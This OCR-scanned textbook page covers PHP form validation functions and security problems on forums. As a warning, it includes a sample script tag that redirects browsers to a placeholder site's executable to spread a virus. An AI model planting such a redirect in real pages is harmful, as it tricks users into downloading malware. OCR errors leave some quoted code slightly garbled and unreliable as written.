  md: "![](img/a10b466d6e11a32674cad146197d13d9_286_0.png)![](img/a10b466d6e11a32674cad146197d13d9_286_1.png)\n\
    \nForm Validation Techniques \n\n• str\\_replace(searc/7, replace, subject) \\\
    - This returns a copy of the string subject in which all \n\noccurrences of the\
    \ string search have been replaced with the string replace. This is handy if \n\
    \nyou don't need to use a RegExp to match groups of characters and is less resource-intensive.\
    \ \n\n• trim(astring) \\- This function returns a copy of the string astring less\
    \ all leading and trailing \n\nwhitespace characters. PHP also has the functions\
    \ ltrim() and rtrim() which you can use \n\nin a similar fashion to get rid of\
    \ leading whitespace and trailing whitespace, respectively. \n\nSecurity Issues\
    \ \n\nThese can be divided into two major areas, annoyance issues and genuine\
    \ security hazards, and are \n\nmost prominent when we're dealing with online\
    \ forums and bulletin boards. These issues arise when \n\nusers attempt to post\
    \ HTML or programming code. Some examples of annoyances are: \n\n• Posting offensive\
    \ words (or other content or links) to inappropriate sites. \n\n• Using very long\
    \ strings of characters/whitespace to widen or lengthen a page to the point of\
    \ \n\nunusability. \n\n• Using HTML tags to interfere with page layout or appearance,\
    \ for example <table \n\nwidth=\"5000\"xtr><td> </tdx/trx/table> or an opening\
    \ <font \n\ncolor=\" #ffffff \" \\> or <pre> tag (without a matching closing tag).\
    \ \n\nMore serious issues include: \n\n• Posting JavaScript code (either in <script>\
    \ tags or tag event handlers) as a form of attention¬ \n\nseeking behavior, or\
    \ in an attempt to run exploits on vulnerable browsers. For instance, \n\nsomeone\
    \ seeking to spread a virus might post something like <script> \n\nself.location.href\
    \ \\= \"http://www.somesite.net/nastyfile.exe\";} \n\n</script> in the hope of\
    \ tricking unwary users into downloading and running an executable \n\nbearing\
    \ a virus or Trojan Horse program. \n\n• Posting server-side code in an attempt\
    \ to disrupt the normal functioning of a site, or to try to \n\nexploit vulnerabilities\
    \ in a site's web server or database. \n\nFortunately, there are ways to deal\
    \ with all of these problems. \n\n• In the case of offensive language, it shouldn't\
    \ be too difficult to use some of the techniques \n\nwe've shown you in this and\
    \ the preceding chapter to construct a simple but effective filter: \n\n$bad\\\
    _words \\= array( \"Not\", \"to\", \"be\", \"posted\", \"here\" ); \n\n$number\\\
    _of\\_words \\= count($bad\\_words); \n\nfor($i=0; $i<$number\\_of\\_words; $i++)\
    \ \n\n$comment\\_text \\= preg\\_replace(\"/\\\\b$bad\\_words\\[$i\\]\\\\b/\"\
    , \"#####\", \n\n$comment\\_text); \n\n• Excess length: PHP has a built-in wordwrap\
    \ (line\\_length) function that can be used on a \n\nblock of text to insert linefeeds\
    \ into words that exceed a given number line\\_length of non¬ \n\nspace characters\
    \ (the default is 76). You can also use the preg\\_match () and strlen () \n\n\
    functions to handle this situation. \n\n271"
